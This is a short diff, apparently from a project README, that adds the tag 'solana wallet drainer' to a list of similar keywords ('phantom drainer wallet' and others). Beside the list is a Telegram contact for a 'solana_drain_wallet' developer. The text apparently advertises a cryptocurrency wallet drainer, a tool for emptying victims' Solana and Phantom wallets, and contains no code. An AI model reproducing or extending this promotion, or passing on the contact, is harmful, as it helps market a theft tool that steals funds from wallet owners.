@@ -31,3 +31,4 @@ CONTACT DEVELOPER - https://t.me/solana_drain_wallet
 # solana phantom drainer
 # spl sol drainer
 # phantom drainer wallet
+# solana wallet drainer
